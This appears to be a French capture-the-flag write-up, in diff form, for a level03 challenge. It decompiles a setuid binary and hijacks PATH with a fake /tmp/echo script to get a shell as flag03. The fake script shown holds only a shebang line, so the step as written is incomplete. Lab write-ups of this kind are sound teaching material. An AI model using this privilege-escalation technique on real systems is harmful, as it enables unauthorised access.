@@ -1,0 +1,30 @@
+Quand on est sur level03 on voit juste un binaire a executer, une fois lance ./level03 on voit "Exploit me"
+
+On prend le binaire et on l'envoie dans un decompiler -> https://dogbolt.org/ (Un qui est online, + simple pour pc de l'ecole)
+Le code s'affiche, on voit notamment la fonction main :
+
+unsigned int main(void)
+{
+    unsigned int gid;  // [bp-0xc]
+    unsigned int uid;  // [bp-0x8]
+
+    gid = getegid();
+    uid = geteuid();
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+    return system("/usr/bin/env echo Exploit me");
+}
+
+On peut voir qu'il y a une utilisation de la fonction env via son path absolu, cependant pour echo ce n'est pas le cas, il va donc chercher l'env PATH pour savoir ou est echo.
+
+On peut donc hijack le PATH pour lancer notre propre script plutot que la fonction echo :
+
+echo -e '#!/bin/sh' > /tmp/echo
+chmod +x /tmp/echo
+export PATH=/tmp:$PATH
+
+ensuite on lance ./level03
+
+ca lancera un nouveau shell, mais cette fois ci on est connecte en tant que flag03 ! On peut regarder en lancant "whoami"
+Et si on est connecte en tant que flag03, il suffit de lancer ; getflag !
+
